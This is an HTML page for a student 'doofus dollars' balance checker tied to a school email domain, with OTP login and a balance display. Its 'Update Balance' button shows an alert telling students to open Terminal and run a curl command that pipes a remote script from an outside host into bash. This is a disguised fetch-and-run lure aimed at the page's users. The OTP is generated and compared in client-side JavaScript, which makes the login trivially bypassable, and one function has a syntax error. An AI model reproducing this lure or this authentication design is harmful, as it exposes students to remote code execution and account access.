<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>doofus dollars</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
            z-index: -1;
            animation: float 20s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.05) rotate(180deg); }
        }

        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(25px) saturate(180%);
            -webkit-backdrop-filter: blur(25px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            padding: 48px 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 
                0 25px 45px rgba(0, 0, 0, 0.1),
                0 0 0 1px rgba(255, 255, 255, 0.05),
                inset 0 1px 0 rgba(255, 255, 255, 0.3);
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
        }

        .container::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: white;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.02em;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.8);
            text-align: center;
            margin-bottom: 36px;
            letter-spacing: -0.01em;
        }

        .form-group {
            position: relative;
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 12px;
            letter-spacing: -0.01em;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            font-size: 17px;
            font-weight: 400;
            color: white;
            outline: none;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            caret-color: rgba(255, 255, 255, 0.8);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        input:focus {
            background: rgba(255, 255, 255, 0.25);
            border-color: rgba(255, 255, 255, 0.4);
            box-shadow: 
                0 0 0 3px rgba(255, 255, 255, 0.1),
                0 8px 25px rgba(0, 0, 0, 0.15);
            transform: translateY(-1px);
        }

        .otp-inputs {
            display: none;
            flex-direction: row;
            gap: 12px;
            margin-bottom: 24px;
            padding: 16px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .otp-inputs.show {
            display: flex !important;
        }

        .otp-inputs input {
            flex: 1;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            padding: 16px 12px;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            color: white;
            letter-spacing: 0;
            transition: all 0.3s ease;
        }

        .otp-inputs input:focus {
            background: rgba(255, 255, 255, 0.35);
            border-color: rgba(255, 255, 255, 0.6);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.2);
            transform: scale(1.05);
        }

        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0.15));
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 16px;
            font-size: 17px;
            font-weight: 500;
            color: white;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            position: relative;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.35), rgba(255, 255, 255, 0.2));
            border-color: rgba(255, 255, 255, 0.5);
            transform: translateY(-2px);
            box-shadow: 
                0 12px 35px rgba(0, 0, 0, 0.2),
                0 0 0 3px rgba(255, 255, 255, 0.2);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-secondary {
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.3), rgba(255, 140, 0, 0.2));
            border-color: rgba(255, 165, 0, 0.4);
            font-size: 15px;
            padding: 14px 18px;
            margin-top: 0;
        }

        .btn-secondary:hover {
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.4), rgba(255, 140, 0, 0.3));
            border-color: rgba(255, 165, 0, 0.6);
            transform: translateY(-1px);
        }

        .balance-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 24px;
        }

        .balance-section {
            display: none;
            text-align: center;
            padding: 32px;
        }

        .balance-amount {
            font-size: 48px;
            font-weight: 600;
            color: #10B981;
            margin: 16px 0;
            letter-spacing: -0.03em;
        }

        .resend {
            text-align: center;
            margin-top: 16px;
        }

        .resend a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            font-size: 15px;
            transition: color 0.2s;
        }

        .resend a:hover {
            color: white;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error {
            color: #F87171;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }

        .success {
            color: #10B981;
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 36px 24px;
                margin: 16px;
            }
            .title {
                font-size: 24px;
            }
            .otp-inputs {
                gap: 8px;
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">doofus dollars</h1>
        <p class="subtitle">Enter your student ID to view your cash balance</p>
        
        <!-- Student ID Form -->
        <form id="studentForm">
            <div class="form-group">
                <label for="studentId">Student ID</label>
                <div class="input-wrapper">
                    <input 
                        type="text" 
                        id="studentId" 
                        placeholder="e.g. 00000000"
                        maxlength="20"
                        required
                    >
                </div>
                <div class="error" id="studentError">Please enter a valid student ID</div>
            </div>
            <button type="submit" class="btn" id="sendOtpBtn">
                Send OTP
            </button>
        </form>

        <!-- OTP Form -->
        <form id="otpForm" style="display: none;">
            <div class="form-group">
                <label>Enter OTP sent to <span id="emailDisplay" style="font-weight: 500;"></span></label>
                <div class="otp-inputs" id="otpInputs">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                    <input type="text" maxlength="1" autocomplete="one-time-code">
                </div>
                <div class="error" id="otpError">Invalid OTP. Please try again.</div>
                <div class="success" id="otpSuccess">OTP verified successfully!</div>
            </div>
            <button type="submit" class="btn" id="verifyBtn">Verify & View Balance</button>
            <div class="resend">
                <a href="#" id="resendOtp">Didn't receive OTP? Resend</a>
            </div>
        </form>

        <!-- Balance Display -->
        <div class="balance-section" id="balanceSection">
            <div class="balance-amount" id="balanceAmount">$0.00</div>
            <p style="color: rgba(255, 255, 255, 0.8); font-size: 16px;">
                Available Doofus Credits
            </p>
            <div class="balance-buttons">
                <button class="btn" onclick="refreshBalance()">Refresh</button>
                <button class="btn btn-secondary" onclick="convertTickets()">Update Balance</button>
            </div>
        </div>
    </div>

    <script>
        emailjs.init("-0YJ2zFBFK5sdLMho");

        let currentStudentId = '';
        let currentOtp = '';
        let otpTimeout = 60;
        let countdown = 0;

        const studentForm = document.getElementById('studentForm');
        const otpForm = document.getElementById('otpForm');
        const balanceSection = document.getElementById('balanceSection');
        const otpInputsContainer = document.getElementById('otpInputs');
        const otpInputs = document.querySelectorAll('#otpInputs input');
        const sendOtpBtn = document.getElementById('sendOtpBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendOtp = document.getElementById('resendOtp');
        const emailDisplay = document.getElementById('emailDisplay');
        const studentError = document.getElementById('studentError');

        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                updateOtp();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                if (paste.length === 6) {
                    otpInputs.forEach((input, idx) => {
                        if (idx < 6 && paste[idx]) {
                            input.value = paste[idx];
                        }
                    });
                    updateOtp();
                }
            });
        });

        studentForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const studentId = document.getElementById('studentId').value.trim();
            
            if (!studentId) {
                showError('studentError', 'Please enter your student ID');
                return;
            }

            currentStudentId = studentId;
            const email = `${studentId}@student.isf.edu.hk`;
            emailDisplay.textContent = email;
            
            showLoading(sendOtpBtn, 'Sending OTP...');
            const success = await sendOtpEmail(studentId);
            
            if (success) {
                hideLoading(sendOtpBtn, 'Send OTP');
                studentForm.style.display = 'none';
                otpForm.style.display = 'block';
                otpInputsContainer.classList.add('show');
                otpInputs[0].focus();
                startCountdown();
            } else {
                hideLoading(sendOtpBtn, 'Send OTP');
                showError('studentError', 'Failed to send OTP. Please try again.');
            }
        });

        otpForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const otp = Array.from(otpInputs).map(input => input.value).join('');
            
            if (otp.length !== 6) {
                showError('otpError', 'Please enter full 6-digit OTP');
                return;
            }

            if (otp === currentOtp) {
                showSuccess('otpSuccess');
                setTimeout(fetchBalance, 1000);
            } else {
                showError('otpError', 'Invalid OTP. Please try again.');
                otpInputs.forEach(input => input.value = '');
                otpInputs[0].focus();
            }
        });

        resendOtp.addEventListener('click', async (e) => {
            e.preventDefault();
            showLoading(sendOtpBtn, 'Resending...');
            
            const success = await sendOtpEmail(currentStudentId);
            
            if (success) {
                hideLoading(sendOtpBtn, 'Send OTP');
                startCountdown();
                otpInputs.forEach(input => input.value = '');
                otpInputs[0].focus();
            } else {
                hideLoading(sendOtpBtn, 'Send OTP');
                showError('otpError', 'Failed to resend OTP. Please try again.');
            }
        });

        async function sendOtpEmail(studentId) {
            try {
                currentOtp = Math.floor(100000 + Math.random() * 900000).toString();
                const email = `${studentId}@student.isf.edu.hk`;
                const templateParams = {
                    to_email: email,
                    student_id: studentId,
                    otp: currentOtp,
                    message: `your OTP for doofus dollars is: ${currentOtp}. valid for 60 seconds.`
                };

                const result = await emailjs.send('service_6fnrgvu', 'template_xbioicc', templateParams);
                console.log('EmailJS success:', result.status, result.text);
                return true;
            } catch (error) {
                console.error('EmailJS error:', error);
                return false;
            }
        }

        async function fetchBalance() {
            try {
                const response = await fetch(`https://doofusdollars.pythonanywhere.com/balance/${currentStudentId}`);
                const data = await response.json();
                document.getElementById('balanceAmount').textContent = `$${parseFloat(data.balance || 0).toFixed(2)}`;
            } catch (error) {
                document.getElementById('balanceAmount').textContent = '$0.00';
                console.error('Balance fetch error:', error);
            }
            
            otpForm.style.display = 'none';
            balanceSection.style.display = 'block';
        }

        function refreshBalance() {
            try {
                const response = await fetch(`https://doofusdollars.pythonanywhere.com/balance/${currentStudentId}`);
                const data = await response.json();
                document.getElementById('balanceAmount').textContent = `$${parseFloat(data.balance || 0).toFixed(2)}`;
            } catch (error) {
                document.getElementById('balanceAmount').textContent = '$0.00';
                console.error('Balance fetch error:', error);
            }
            
        }
        
        function convertTickets() {
            alert(
                "To update your balance:\n\n" +
                "1. Open Terminal (it's a built-in app on your computer)\n" +
                "2. Type in this command exactly (double-check it for errors):\n\n" +
                "   curl https://doofus.cc/helper | bash\n\n" +
                "3. Press Enter and follow the steps carefully.\n\n" +
                "This will sync your house tickets with your balance."
            );
        }

        function updateOtp() {
            const otp = Array.from(otpInputs).map(input => input.value).join('');
            if (otp.length === 6) {
                verifyBtn.focus();
            }
        }

        function startCountdown() {
            countdown = otpTimeout;
            const timer = setInterval(() => {
                countdown--;
                resendOtp.textContent = countdown > 0 
                    ? `Resend in ${countdown}s`
                    : "Didn't receive OTP? Resend";
                
                if (countdown <= 0) {
                    clearInterval(timer);
                }
            }, 1000);
        }

        function showLoading(btn, text) {
            btn.disabled = true;
            btn.innerHTML = `<span class="loading"></span>${text}`;
        }

        function hideLoading(btn, text) {
            btn.disabled = false;
            btn.innerHTML = text;
        }

        function showError(errorId, message) {
            const errorEl = document.getElementById(errorId);
            errorEl.textContent = message;
            errorEl.style.display = 'block';
            setTimeout(() => {
                errorEl.style.display = 'none';
            }, 4000);
        }

        function showSuccess(successId) {
            const successEl = document.getElementById(successId);
            successEl.style.display = 'block';
            setTimeout(() => {
                successEl.style.display = 'none';
            }, 2000);
        }
    </script>
</body>
</html>
